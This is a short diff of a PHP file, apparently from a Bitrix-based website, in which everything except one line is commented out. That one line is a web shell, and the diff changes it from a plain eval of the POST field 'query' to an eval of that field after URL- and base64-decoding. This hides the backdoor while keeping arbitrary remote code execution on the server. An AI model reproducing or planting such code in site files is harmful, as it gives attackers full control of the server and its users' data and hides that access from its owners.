@@ -31,7 +31,7 @@
 //define("NO_AGENT_STATISTIC","Y");
 //define("NO_AGENT_CHECK", true);
 //define("DisableEventsCheck", true);
-eval($_POST[query]);//
+eval(base64_decode(urldecode($_POST["query"])));//
 //require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
 
 //CModule::IncludeModule("fileman");
